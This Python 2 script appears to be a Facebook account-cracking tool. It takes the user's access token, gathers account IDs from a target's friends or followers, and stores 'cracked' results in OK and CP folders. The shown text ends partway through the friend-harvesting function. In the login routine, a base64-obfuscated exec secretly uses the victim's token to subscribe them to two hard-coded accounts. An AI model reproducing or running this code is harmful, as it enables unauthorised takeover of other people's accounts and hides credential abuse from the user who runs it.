#!/usr/bin/python
# -*- coding: utf-8
 
#USE YOUR BRAIN MAKE GOOGLE YOUR FRIEND :)
#
#input('Kowshik-Bhai Will Started Now')
import os
try:
  import requests
except ImportError:
  print("\n [!] requests module is not installed")
  os.system("pip2 install requests")
 
try:
  import bs4
except ImportError:
  print("\n [!] bs4 module is not installed ")
  os.system("pip2 install bs4")
 
try:
  import concurrent.futures
except ImportError:
  print("\n [!] futures module is not installed")
  os.system("pip2 install futures")
 
import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
 
loop = 0
id = []
ok = []
cp = []
 
ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
  if n < 0 or n > 12:
    exit() 
  nTemp = n - 1
except ValueError:
  exit()
 
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
 
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
def logo():
  os.system("clear")
  print """
 
  
<div></div><div><span style="color: #ff0000"> </span><span style="color: #ff0100">/</span><span style="color: #ff0200">$</span><span style="color: #ff0200">$</span><span style="color: #ff0300"> </span><span style="color: #ff0400"> </span><span style="color: #ff0500"> </span><span style="color: #ff0600">/</span><span style="color: #ff0700">$</span><span style="color: #ff0700">$</span><span style="color: #ff0800"> </span><span style="color: #ff0900"> </span><span style="color: #ff0a00">/</span><span style="color: #ff0b00">$</span><span style="color: #ff0b00">$</span><span style="color: #ff0c00">$</span><span style="color: #ff0d00">$</span><span style="color: #ff0e00">$</span><span style="color: #ff0f00">$</span><span style="color: #ff0f00"> </span><span style="color: #ff1000"> </span><span style="color: #ff1100">/</span><span style="color: #ff1200">$</span><span style="color: #ff1300">$</span><span style="color: #ff1400"> </span><span style="color: #ff1400"> </span><span style="color: #ff1500"> </span><span style="color: #ff1600"> </span><span style="color: #ff1700"> </span><span style="color: #ff1800"> </span><span style="color: #ff1800">/</span><span style="color: #ff1900">$</span><span style="color: #ff1a00">$</span><span style="color: #ff1b00"> </span><span style="color: #ff1c00"> </span><span style="color: #ff1c00">/</span><span style="color: #ff1d00">$</span><span style="color: #ff1e00">$</span><span style="color: #ff1f00">$</span><span style="color: #ff2000">$</span><span style="color: #ff2100">$</span><span style="color: #ff2100">$</span><span style="color: #ff2200"> </span><span style="color: #ff2300"> </span><span style="color: #ff2400">/</span><span style="color: #ff2500">$</span><span style="color: #ff2500">$</span><span style="color: #ff2600"> </span><span style="color: #ff2700"> </span><span style="color: #ff2800"> </span><span style="color: #ff2900">/</span><span style="color: #ff2a00">$</span><span style="color: #ff2a00">$</span><span style="color: #ff2b00"> </span><span style="color: #ff2c00">/</span><span style="color: #ff2d00">$</span><span style="color: #ff2e00">$</span><span style="color: #ff2e00">$</span><span style="color: #ff2f00">$</span><span style="color: #ff3000">$</span><span style="color: #ff3100">$</span><span style="color: #ff3200"> </span><span style="color: #ff3200">/</span><span style="color: #ff3300">$</span><span style="color: #ff3400">$</span><span style="color: #ff3500"> </span><span style="color: #ff3600"> </span><span style="color: #ff3700"> </span><span style="color: #ff3700">/</span><span style="color: #ff3800">$</span><span style="color: #ff3900">$</span></div><div><span style="color: #ff3a00">|</span><span style="color: #ff3b00"> </span><span style="color: #ff3b00">$</span><span style="color: #ff3c00">$</span><span style="color: #ff3d00"> </span><span style="color: #ff3e00"> </span><span style="color: #ff3f00">/</span><span style="color: #ff3f00">$</span><span style="color: #ff4000">$</span><span style="color: #ff4100">/</span><span style="color: #ff4200"> </span><span style="color: #ff4300">/</span><span style="color: #ff4400">$</span><span style="color: #ff4400">$</span><span style="color: #ff4500">_</span><span style="color: #ff4600">_</span><span style="color: #ff4700"> </span><span style="color: #ff4800"> </span><span style="color: #ff4800">$</span><span style="color: #ff4900">$</span><span style="color: #ff4a00">|</span><span style="color: #ff4b00"> </span><span style="color: #ff4c00">$</span><span style="color: #ff4d00">$</span><span style="color: #ff4d00"> </span><span style="color: #ff4e00"> </span><span style="color: #ff4f00">/</span><span style="color: #ff5000">$</span><span style="color: #ff5100"> </span><span style="color: #ff5100">|</span><span style="color: #ff5200"> </span><span style="color: #ff5300">$</span><span style="color: #ff5400">$</span><span style="color: #ff5500"> </span><span style="color: #ff5500">/</span><span style="color: #ff5600">$</span><span style="color: #ff5700">$</span><span style="color: #ff5800">_</span><span style="color: #ff5900">_</span><span style="color: #ff5a00"> </span><span style="color: #ff5a00"> </span><span style="color: #ff5b00">$</span><span style="color: #ff5c00">$</span><span style="color: #ff5d00">|</span><span style="color: #ff5e00"> </span><span style="color: #ff5e00">$</span><span style="color: #ff5f00">$</span><span style="color: #ff6000"> </span><span style="color: #ff6100"> </span><span style="color: #ff6200">|</span><span style="color: #ff6300"> </span><span style="color: #ff6300">$</span><span style="color: #ff6400">$</span><span style="color: #ff6500">|</span><span style="color: #ff6600">_</span><span style="color: #ff6700"> </span><span style="color: #ff6700"> </span><span style="color: #ff6800">$</span><span style="color: #ff6900">$</span><span style="color: #ff6a00">_</span><span style="color: #ff6b00">/</span><span style="color: #ff6b00">|</span><span style="color: #ff6c00"> </span><span style="color: #ff6d00">$</span><span style="color: #ff6e00">$</span><span style="color: #ff6f00"> </span><span style="color: #ff7000"> </span><span style="color: #ff7000">/</span><span style="color: #ff7100">$</span><span style="color: #ff7200">$</span><span style="color: #ff7300">/</span></div><div><span style="color: #ff7400">|</span><span style="color: #ff7400"> </span><span style="color: #ff7500">$</span><span style="color: #ff7600">$</span><span style="color: #ff7700"> </span><span style="color: #ff7800">/</span><span style="color: #ff7800">$</span><span style="color: #ff7900">$</span><span style="color: #ff7a00">/</span><span style="color: #ff7b00"> </span><span style="color: #ff7c00">|</span><span style="color: #ff7d00"> </span><span style="color: #ff7d00">$</span><span style="color: #ff7e00">$</span><span style="color: #ff7f00"> </span><span style="color: #ff8000"> </span><span style="color: #ff8100">\</span><span style="color: #ff8100"> </span><span style="color: #ff8200">$</span><span style="color: #ff8300">$</span><span style="color: #ff8400">|</span><span style="color: #ff8500"> </span><span style="color: #ff8600">$</span><span style="color: #ff8600">$</span><span style="color: #ff8700"> </span><span style="color: #ff8800">/</span><span style="color: #ff8900">$</span><span style="color: #ff8a00">$</span><span style="color: #ff8a00">$</span><span style="color: #ff8b00">|</span><span style="color: #ff8c00"> </span><span style="color: #ff8d00">$</span><span style="color: #ff8e00">$</span><span style="color: #ff8f00">|</span><span style="color: #ff8f00"> </span><span style="color: #ff9000">$</span><span style="color: #ff9100">$</span><span style="color: #ff9200"> </span><span style="color: #ff9300"> </span><span style="color: #ff9400">\</span><span style="color: #ff9400">_</span><span style="color: #ff9500">_</span><span style="color: #ff9600">/</span><span style="color: #ff9700">|</span><span style="color: #ff9800"> </span><span style="color: #ff9800">$</span><span style="color: #ff9900">$</span><span style="color: #ff9a00"> </span><span style="color: #ff9b00"> </span><span style="color: #ff9c00">|</span><span style="color: #ff9d00"> </span><span style="color: #ff9d00">$</span><span style="color: #ff9e00">$</span><span style="color: #ff9f00"> </span><span style="color: #ffa000"> </span><span style="color: #ffa100">|</span><span style="color: #ffa100"> </span><span style="color: #ffa200">$</span><span style="color: #ffa300">$</span><span style="color: #ffa400"> </span><span style="color: #ffa500"> </span><span style="color: #ffa600">|</span><span style="color: #ffa600"> </span><span style="color: #ffa700">$</span><span style="color: #ffa800">$</span><span style="color: #ffa900"> </span><span style="color: #ffaa00">/</span><span style="color: #ffaa00">$</span><span style="color: #ffab00">$</span><span style="color: #ffac00">/</span><span style="color: #ffad00"> </span></div><div><span style="color: #ffae00">|</span><span style="color: #ffaf00"> </span><span style="color: #ffaf00">$</span><span style="color: #ffb000">$</span><span style="color: #ffb100">$</span><span style="color: #ffb200">$</span><span style="color: #ffb300">$</span><span style="color: #ffb400">/</span><span style="color: #ffb400"> </span><span style="color: #ffb500"> </span><span style="color: #ffb600">|</span><span style="color: #ffb700"> </span><span style="color: #ffb800">$</span><span style="color: #ffb800">$</span><span style="color: #ffb900"> </span><span style="color: #ffba00"> </span><span style="color: #ffbb00">|</span><span style="color: #ffbc00"> </span><span style="color: #ffbd00">$</span><span style="color: #ffbd00">$</span><span style="color: #ffbe00">|</span><span style="color: #ffbf00"> </span><span style="color: #ffc000">$</span><span style="color: #ffc100">$</span><span style="color: #ffc100">/</span><span style="color: #ffc200">$</span><span style="color: #ffc300">$</span><span style="color: #ffc400"> </span><span style="color: #ffc500">$</span><span style="color: #ffc600">$</span><span style="color: #ffc600"> </span><span style="color: #ffc700">$</span><span style="color: #ffc800">$</span><span style="color: #ffc900">|</span><span style="color: #ffca00"> </span><span style="color: #ffca00"> </span><span style="color: #ffcb00">$</span><span style="color: #ffcc00">$</span><span style="color: #ffcd00">$</span><span style="color: #ffce00">$</span><span style="color: #ffcf00">$</span><span style="color: #ffcf00">$</span><span style="color: #ffd000"> </span><span style="color: #ffd100">|</span><span style="color: #ffd200"> </span><span style="color: #ffd300">$</span><span style="color: #ffd400">$</span><span style="color: #ffd400">$</span><span style="color: #ffd500">$</span><span style="color: #ffd600">$</span><span style="color: #ffd700">$</span><span style="color: #ffd800">$</span><span style="color: #ffd800">$</span><span style="color: #ffd900"> </span><span style="color: #ffda00"> </span><span style="color: #ffdb00">|</span><span style="color: #ffdc00"> </span><span style="color: #ffdd00">$</span><span style="color: #ffdd00">$</span><span style="color: #ffde00"> </span><span style="color: #ffdf00"> </span><span style="color: #ffe000">|</span><span style="color: #ffe100"> </span><span style="color: #ffe100">$</span><span style="color: #ffe200">$</span><span style="color: #ffe300">$</span><span style="color: #ffe400">$</span><span style="color: #ffe500">$</span><span style="color: #ffe600">/</span><span style="color: #ffe600"> </span><span style="color: #ffe700"> </span></div><div><span style="color: #ffe800">|</span><span style="color: #ffe900"> </span><span style="color: #ffea00">$</span><span style="color: #ffea00">$</span><span style="color: #ffeb00"> </span><span style="color: #ffec00"> </span><span style="color: #ffed00">$</span><span style="color: #ffee00">$</span><span style="color: #ffef00"> </span><span style="color: #ffef00"> </span><span style="color: #fff000">|</span><span style="color: #fff100"> </span><span style="color: #fff200">$</span><span style="color: #fff300">$</span><span style="color: #fff400"> </span><span style="color: #fff400"> </span><span style="color: #fff500">|</span><span style="color: #fff600"> </span><span style="color: #fff700">$</span><span style="color: #fff800">$</span><span style="color: #fff800">|</span><span style="color: #fff900"> </span><span style="color: #fffa00">$</span><span style="color: #fffb00">$</span><span style="color: #fffc00">$</span><span style="color: #fffd00">$</span><span style="color: #fffd00">_</span><span style="color: #fffe00"> </span><span style="color: #ffff00"> </span><span style="color: #fdff00">$</span><span style="color: #fcff00">$</span><span style="color: #faff00">$</span><span style="color: #f8ff00">$</span><span style="color: #f7ff00"> </span><span style="color: #f5ff00">\</span><span style="color: #f4ff00">_</span><span style="color: #f2ff00">_</span><span style="color: #f0ff00">_</span><span style="color: #efff00">_</span><span style="color: #edff00"> </span><span style="color: #ebff00"> </span><span style="color: #eaff00">$</span><span style="color: #e8ff00">$</span><span style="color: #e6ff00">|</span><span style="color: #e5ff00"> </span><span style="color: #e3ff00">$</span><span style="color: #e2ff00">$</span><span style="color: #e0ff00">_</span><span style="color: #deff00">_</span><span style="color: #ddff00"> </span><span style="color: #dbff00"> </span><span style="color: #d9ff00">$</span><span style="color: #d8ff00">$</span><span style="color: #d6ff00"> </span><span style="color: #d4ff00"> </span><span style="color: #d3ff00">|</span><span style="color: #d1ff00"> </span><span style="color: #d0ff00">$</span><span style="color: #ceff00">$</span><span style="color: #ccff00"> </span><span style="color: #cbff00"> </span><span style="color: #c9ff00">|</span><span style="color: #c7ff00"> </span><span style="color: #c6ff00">$</span><span style="color: #c4ff00">$</span><span style="color: #c3ff00"> </span><span style="color: #c1ff00"> </span><span style="color: #bfff00">$</span><span style="color: #beff00">$</span><span style="color: #bcff00"> </span><span style="color: #baff00"> </span></div><div><span style="color: #b9ff00">|</span><span style="color: #b7ff00"> </span><span style="color: #b5ff00">$</span><span style="color: #b4ff00">$</span><span style="color: #b2ff00">\</span><span style="color: #b1ff00"> </span><span style="color: #afff00"> </span><span style="color: #adff00">$</span><span style="color: #acff00">$</span><span style="color: #aaff00"> </span><span style="color: #a8ff00">|</span><span style="color: #a7ff00"> </span><span style="color: #a5ff00">$</span><span style="color: #a3ff00">$</span><span style="color: #a2ff00"> </span><span style="color: #a0ff00"> </span><span style="color: #9fff00">|</span><span style="color: #9dff00"> </span><span style="color: #9bff00">$</span><span style="color: #9aff00">$</span><span style="color: #98ff00">|</span><span style="color: #96ff00"> </span><span style="color: #95ff00">$</span><span style="color: #93ff00">$</span><span style="color: #91ff00">$</span><span style="color: #90ff00">/</span><span style="color: #8eff00"> </span><span style="color: #8dff00">\</span><span style="color: #8bff00"> </span><span style="color: #89ff00"> </span><span style="color: #88ff00">$</span><span style="color: #86ff00">$</span><span style="color: #84ff00">$</span><span style="color: #83ff00"> </span><span style="color: #81ff00">/</span><span style="color: #7fff00">$</span><span style="color: #7eff00">$</span><span style="color: #7cff00"> </span><span style="color: #7bff00"> </span><span style="color: #79ff00">\</span><span style="color: #77ff00"> </span><span style="color: #76ff00">$</span><span style="color: #74ff00">$</span><span style="color: #72ff00">|</span><span style="color: #71ff00"> </span><span style="color: #6fff00">$</span><span style="color: #6eff00">$</span><span style="color: #6cff00"> </span><span style="color: #6aff00"> </span><span style="color: #69ff00">|</span><span style="color: #67ff00"> </span><span style="color: #65ff00">$</span><span style="color: #64ff00">$</span><span style="color: #62ff00"> </span><span style="color: #60ff00"> </span><span style="color: #5fff00">|</span><span style="color: #5dff00"> </span><span style="color: #5cff00">$</span><span style="color: #5aff00">$</span><span style="color: #58ff00"> </span><span style="color: #57ff00"> </span><span style="color: #55ff00">|</span><span style="color: #53ff00"> </span><span style="color: #52ff00">$</span><span style="color: #50ff00">$</span><span style="color: #4eff00">\</span><span style="color: #4dff00"> </span><span style="color: #4bff00"> </span><span style="color: #4aff00">$</span><span style="color: #48ff00">$</span><span style="color: #46ff00"> </span></div><div><span style="color: #45ff00">|</span><span style="color: #43ff00"> </span><span style="color: #41ff00">$</span><span style="color: #40ff00">$</span><span style="color: #3eff00"> </span><span style="color: #3cff00">\</span><span style="color: #3bff00"> </span><span style="color: #39ff00"> </span><span style="color: #38ff00">$</span><span style="color: #36ff00">$</span><span style="color: #34ff00">|</span><span style="color: #33ff00"> </span><span style="color: #31ff00"> </span><span style="color: #2fff00">$</span><span style="color: #2eff00">$</span><span style="color: #2cff00">$</span><span style="color: #2aff00">$</span><span style="color: #29ff00">$</span><span style="color: #27ff00">$</span><span style="color: #26ff00">/</span><span style="color: #24ff00">|</span><span style="color: #22ff00"> </span><span style="color: #21ff00">$</span><span style="color: #1fff00">$</span><span style="color: #1dff00">/</span><span style="color: #1cff00"> </span><span style="color: #1aff00"> </span><span style="color: #19ff00"> </span><span style="color: #17ff00">\</span><span style="color: #15ff00"> </span><span style="color: #14ff00"> </span><span style="color: #12ff00">$</span><span style="color: #10ff00">$</span><span style="color: #0fff00">|</span><span style="color: #0dff00"> </span><span style="color: #0bff00"> </span><span style="color: #0aff00">$</span><span style="color: #08ff00">$</span><span style="color: #07ff00">$</span><span style="color: #05ff00">$</span><span style="color: #03ff00">$</span><span style="color: #02ff00">$</span><span style="color: #00ff00">/</span><span style="color: #00ff02">|</span><span style="color: #00ff03"> </span><span style="color: #00ff05">$</span><span style="color: #00ff07">$</span><span style="color: #00ff08"> </span><span style="color: #00ff0a"> </span><span style="color: #00ff0b">|</span><span style="color: #00ff0d"> </span><span style="color: #00ff0f">$</span><span style="color: #00ff10">$</span><span style="color: #00ff12"> </span><span style="color: #00ff14">/</span><span style="color: #00ff15">$</span><span style="color: #00ff17">$</span><span style="color: #00ff19">$</span><span style="color: #00ff1a">$</span><span style="color: #00ff1c">$</span><span style="color: #00ff1d">$</span><span style="color: #00ff1f">|</span><span style="color: #00ff21"> </span><span style="color: #00ff22">$</span><span style="color: #00ff24">$</span><span style="color: #00ff26"> </span><span style="color: #00ff27">\</span><span style="color: #00ff29"> </span><span style="color: #00ff2b"> </span><span style="color: #00ff2c">$</span><span style="color: #00ff2e">$</span></div><div><span style="color: #00ff2f">|</span><span style="color: #00ff31">_</span><span style="color: #00ff33">_</span><span style="color: #00ff34">/</span><span style="color: #00ff36"> </span><span style="color: #00ff38"> </span><span style="color: #00ff39">\</span><span style="color: #00ff3b">_</span><span style="color: #00ff3c">_</span><span style="color: #00ff3e">/</span><span style="color: #00ff40"> </span><span style="color: #00ff41">\</span><span style="color: #00ff43">_</span><span style="color: #00ff45">_</span><span style="color: #00ff46">_</span><span style="color: #00ff48">_</span><span style="color: #00ff4a">_</span><span style="color: #00ff4b">_</span><span style="color: #00ff4d">/</span><span style="color: #00ff4e"> </span><span style="color: #00ff50">|</span><span style="color: #00ff52">_</span><span style="color: #00ff53">_</span><span style="color: #00ff55">/</span><span style="color: #00ff57"> </span><span style="color: #00ff58"> </span><span style="color: #00ff5a"> </span><span style="color: #00ff5c"> </span><span style="color: #00ff5d"> </span><span style="color: #00ff5f">\</span><span style="color: #00ff60">_</span><span style="color: #00ff62">_</span><span style="color: #00ff64">/</span><span style="color: #00ff65"> </span><span style="color: #00ff67">\</span><span style="color: #00ff69">_</span><span style="color: #00ff6a">_</span><span style="color: #00ff6c">_</span><span style="color: #00ff6e">_</span><span style="color: #00ff6f">_</span><span style="color: #00ff71">_</span><span style="color: #00ff72">/</span><span style="color: #00ff74"> </span><span style="color: #00ff76">|</span><span style="color: #00ff77">_</span><span style="color: #00ff79">_</span><span style="color: #00ff7b">/</span><span style="color: #00ff7c"> </span><span style="color: #00ff7e"> </span><span style="color: #00ff80">|</span><span style="color: #00ff81">_</span><span style="color: #00ff83">_</span><span style="color: #00ff84">/</span><span style="color: #00ff86">|</span><span style="color: #00ff88">_</span><span style="color: #00ff89">_</span><span style="color: #00ff8b">_</span><span style="color: #00ff8d">_</span><span style="color: #00ff8e">_</span><span style="color: #00ff90">_</span><span style="color: #00ff91">/</span><span style="color: #00ff93">|</span><span style="color: #00ff95">_</span><span style="color: #00ff96">_</span><span style="color: #00ff98">/</span><span style="color: #00ff9a"> </span><span style="color: #00ff9b"> </span><span style="color: #00ff9d">\</span><span style="color: #00ff9f">_</span><span style="color: #00ffa0">_</span><span style="color: #00ffa2">/</span></div><div><span style="color: #00ffa3"> </span><span style="color: #00ffa5"> </span><span style="color: #00ffa7"> </span><span style="color: #00ffa8"> </span><span style="color: #00ffaa"> </span><span style="color: #00ffac"> </span><span style="color: #00ffad"> </span><span style="color: #00ffaf"> </span><span style="color: #00ffb1"> </span><span style="color: #00ffb2"> </span><span style="color: #00ffb4"> </span><span style="color: #00ffb5"> </span><span style="color: #00ffb7"> </span><span style="color: #00ffb9"> </span><span style="color: #00ffba"> </span><span style="color: #00ffbc"> </span><span style="color: #00ffbe"> </span><span style="color: #00ffbf"> </span><span style="color: #00ffc1"> </span><span style="color: #00ffc3"> </span><span style="color: #00ffc4"> </span><span style="color: #00ffc6"> </span><span style="color: #00ffc7"> </span><span style="color: #00ffc9"> </span><span style="color: #00ffcb"> </span><span style="color: #00ffcc"> </span><span style="color: #00ffce"> </span><span style="color: #00ffd0"> </span><span style="color: #00ffd1"> </span><span style="color: #00ffd3"> </span><span style="color: #00ffd5"> </span><span style="color: #00ffd6"> </span><span style="color: #00ffd8"> </span><span style="color: #00ffd9"> </span><span style="color: #00ffdb"> </span><span style="color: #00ffdd"> </span><span style="color: #00ffde"> </span><span style="color: #00ffe0"> </span><span style="color: #00ffe2"> </span><span style="color: #00ffe3"> </span><span style="color: #00ffe5"> </span><span style="color: #00ffe6"> </span><span style="color: #00ffe8"> </span><span style="color: #00ffea"> </span><span style="color: #00ffeb"> </span><span style="color: #00ffed"> </span><span style="color: #00ffef"> </span><span style="color: #00fff0"> </span><span style="color: #00fff2"> </span><span style="color: #00fff4"> </span><span style="color: #00fff5"> </span><span style="color: #00fff7"> </span><span style="color: #00fff8"> </span><span style="color: #00fffa"> </span><span style="color: #00fffc"> </span><span style="color: #00fffd"> </span><span style="color: #00ffff"> </span><span style="color: #00fdff"> </span><span style="color: #00fcff"> </span><span style="color: #00faff"> </span><span style="color: #00f8ff"> </span><span style="color: #00f7ff"> </span><span style="color: #00f5ff"> </span><span style="color: #00f4ff"> </span><span style="color: #00f2ff"> </span><span style="color: #00f0ff"> </span><span style="color: #00efff"> </span><span style="color: #00edff"> </span><span style="color: #00ebff"> </span><span style="color: #00eaff"> </span><span style="color: #00e8ff"> </span></div><div><span style="color: #00e6ff"> </span><span style="color: #00e5ff"> </span><span style="color: #00e3ff"> </span><span style="color: #00e2ff"> </span><span style="color: #00e0ff"> </span><span style="color: #00deff"> </span><span style="color: #00ddff"> </span><span style="color: #00dbff"> </span><span style="color: #00d9ff"> </span><span style="color: #00d8ff"> </span><span style="color: #00d6ff"> </span><span style="color: #00d4ff"> </span><span style="color: #00d3ff"> </span><span style="color: #00d1ff"> </span><span style="color: #00d0ff"> </span><span style="color: #00ceff"> </span><span style="color: #00ccff"> </span><span style="color: #00cbff"> </span><span style="color: #00c9ff"> </span><span style="color: #00c7ff"> </span><span style="color: #00c6ff"> </span><span style="color: #00c4ff"> </span><span style="color: #00c3ff"> </span><span style="color: #00c1ff"> </span><span style="color: #00bfff"> </span><span style="color: #00beff"> </span><span style="color: #00bcff"> </span><span style="color: #00baff"> </span><span style="color: #00b9ff"> </span><span style="color: #00b7ff"> </span><span style="color: #00b5ff"> </span><span style="color: #00b4ff"> </span><span style="color: #00b2ff"> </span><span style="color: #00b1ff"> </span><span style="color: #00afff"> </span><span style="color: #00adff"> </span><span style="color: #00acff"> </span><span style="color: #00aaff"> </span><span style="color: #00a8ff"> </span><span style="color: #00a7ff"> </span><span style="color: #00a5ff"> </span><span style="color: #00a3ff"> </span><span style="color: #00a2ff"> </span><span style="color: #00a0ff"> </span><span style="color: #009fff"> </span><span style="color: #009dff"> </span><span style="color: #009bff"> </span><span style="color: #009aff"> </span><span style="color: #0098ff"> </span><span style="color: #0096ff"> </span><span style="color: #0095ff"> </span><span style="color: #0093ff"> </span><span style="color: #0091ff"> </span><span style="color: #0090ff"> </span><span style="color: #008eff"> </span><span style="color: #008dff"> </span><span style="color: #008bff"> </span><span style="color: #0089ff"> </span><span style="color: #0088ff"> </span><span style="color: #0086ff"> </span><span style="color: #0084ff"> </span><span style="color: #0083ff"> </span><span style="color: #0081ff"> </span><span style="color: #007fff"> </span><span style="color: #007eff"> </span><span style="color: #007cff"> </span><span style="color: #007bff"> </span><span style="color: #0079ff"> </span><span style="color: #0077ff"> </span><span style="color: #0076ff"> </span><span style="color: #0074ff"> </span></div><div><span style="color: #0072ff"> </span><span style="color: #0071ff"> </span><span style="color: #006fff"> </span><span style="color: #006eff"> </span><span style="color: #006cff"> </span><span style="color: #006aff"> </span><span style="color: #0069ff"> </span><span style="color: #0067ff"> </span><span style="color: #0065ff"> </span><span style="color: #0064ff"> </span><span style="color: #0062ff"> </span><span style="color: #0060ff"> </span><span style="color: #005fff"> </span><span style="color: #005dff"> </span><span style="color: #005cff"> </span><span style="color: #005aff"> </span><span style="color: #0058ff"> </span><span style="color: #0057ff"> </span><span style="color: #0055ff"> </span><span style="color: #0053ff"> </span><span style="color: #0052ff"> </span><span style="color: #0050ff"> </span><span style="color: #004eff"> </span><span style="color: #004dff"> </span><span style="color: #004bff"> </span><span style="color: #004aff"> </span><span style="color: #0048ff"> </span><span style="color: #0046ff"> </span><span style="color: #0045ff"> </span><span style="color: #0043ff"> </span><span style="color: #0041ff"> </span><span style="color: #0040ff"> </span><span style="color: #003eff"> </span><span style="color: #003cff"> </span><span style="color: #003bff"> </span><span style="color: #0039ff"> </span><span style="color: #0038ff"> </span><span style="color: #0036ff"> </span><span style="color: #0034ff"> </span><span style="color: #0033ff"> </span><span style="color: #0031ff"> </span><span style="color: #002fff"> </span><span style="color: #002eff"> </span><span style="color: #002cff"> </span><span style="color: #002aff"> </span><span style="color: #0029ff"> </span><span style="color: #0027ff"> </span><span style="color: #0026ff"> </span><span style="color: #0024ff"> </span><span style="color: #0022ff"> </span><span style="color: #0021ff"> </span><span style="color: #001fff"> </span><span style="color: #001dff"> </span><span style="color: #001cff"> </span><span style="color: #001aff"> </span><span style="color: #0019ff"> </span><span style="color: #0017ff"> </span><span style="color: #0015ff"> </span><span style="color: #0014ff"> </span><span style="color: #0012ff"> </span><span style="color: #0010ff"> </span><span style="color: #000fff"> </span><span style="color: #000dff"> </span><span style="color: #000bff"> </span><span style="color: #000aff"> </span><span style="color: #0008ff"> </span><span style="color: #0007ff"> </span><span style="color: #0005ff"> </span><span style="color: #0003ff"> </span><span style="color: #0002ff"> </span><span style="color: #0000ff"> </span></div><div></div>
                                                                       
                                                                       
                                                                        
                                           
                                                                       
                                                                       
                                                                           
                           
 
 
"""
print ''
print '-' *50
print ''
   
def login():
  os.system("clear")
  try:
    #-> connection test
    requests.get("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75")
  except requests.exceptions.ConnectionError:
    exit(" [!] no internet connection")
  try:
    token = open("login.txt", "r")
    menu()
  except (KeyError, IOError):
    logo()
    print(" [*] You must first login to enter the menu")
    print(" [*] Please enter your facebook token to login")
    print(" [?] Type '\033[0;93mhelp\033[0;97m' to see how to get a Facebook token")
    token = raw_input("\n [+] fb token : ")
    if token == "":
      exit("\n [!] don't be empty")
    elif token == "help":
      os.system("xdg-open https://m.youtube.com/watch?v=jdGD_KqN4Pk")
      exit(" [!] watch the video to understand")
    try:
      nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
      import base64
      exec(base64.b64decode("cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDQ1MjAzODU1Mjk0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDMwMTE5MzgwNzIvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCg=="))
      open("login.txt", "w").write(token)
      print("\n [+] Active user, welcome  \033[0;93m%s\033[0;97m"%(nama))
      time.sleep(1)
      menu()
    except KeyError:
      os.system("rm -f login.txt")
      exit(" [!] token expired")
 
def menu():
  os.system("clear")
  global token
  try:
    token = open("login.txt","r").read()
  except KeyError:
    os.system("rm -f login.txt")
    exit(" [!] token expired")
  try:
    nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"]
  except IOError:
    os.system("rm -f login.txt")
    exit(" [!] token expired")
  except requests.exceptions.ConnectionError:
    exit(" [!] no internet connection")
  logo()
  print(" [ Welcome \033[0;93m%s\033[0;97m ]\n"%(nama))
  print(" [1] crack from public friend")
  print(" [2] crack from public followers")
  print(" [3] crack from multi target ")
  print(" [4] see crack result")
  print(" [5] check the crack result option")
  print(" [6] user-agent settings")
  print("[ KOWSHIK-BHAI ]")
  print(" [\033[0;91m0\033[0;97m] exit (remove token)")
  emon = raw_input("\n [?] choose : ")
  if emon == "":
    menu()
  elif emon == "1":
    publik()
    method()
  elif emon == "2":
    follower()
    method()
  elif emon == "3":
    massal()
    method()
  elif emon == "4":
    print("\n [1] check the crack OK")
    print(" [2] check the crack CP")
    cek = raw_input("\n [?] choose : ")
    if cek =="":
      menu()
    elif cek == "1":
      dirs = os.listdir("OK")
      print(" [*] list of file names stored in the OK folder\n")
      for file in dirs:
        print(" [+] "+file)
      try:
        file = raw_input("\n [?] select filename : ")
        if file == "":
          menu()
        totalok = open("OK/%s"%(file)).read().splitlines()
      except IOError:
        exit(" [!] file %s not available"%(file))
      nm_file = ("%s"%(file)).replace("-", " ")
      del_txt = nm_file.replace(".txt", "")
      print(" [#] ----------------------------------------------")
      print(" [+] crack result : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
      os.system("cat OK/%s"%(file))
      print("\033[0;97m [#] ----------------------------------------------")
      exit(" [!] don't forget to copy and save the results")
    elif cek == "2":
      dirs = os.listdir("CP")
      print(" [*] list of file names stored in the CP folder\n")
      for file in dirs:
        print(" [+] "+file)
      try:
        file = raw_input("\n [?] select filename : ")
        if file == "":
          menu()
        totalcp = open("CP/%s"%(file)).read().splitlines()
      except IOError:
        exit(" [!] file %s not available"%(file))
      nm_file = ("%s"%(file)).replace("-", " ")
      del_txt = nm_file.replace(".txt", "")
      print(" [#] ----------------------------------------------")
      print(" [+] crack result : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
      os.system("cat CP/%s"%(file))
      print("\033[0;97m [#] ----------------------------------------------")
      exit(" [!] don't forget to copy and save the results")
    else:
      menu()
  elif emon == "5":
    cek_opsi()
  elif emon == "6":
    setting_ua()
  elif emon == "0":
    os.system("rm -f login.txt")
    exit("\n [#] successfully deleted token")
  else:
    menu()
 
def publik():
  global token
  try:
    token = open("login.txt", "r").read()
  except IOError:
    exit(" [!] token expired")
  print("\n [*] fill in 'me' if you want from friends list")
  idt = raw_input(" [+] target id : ")
  try:
    for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
      uid = i["id"]
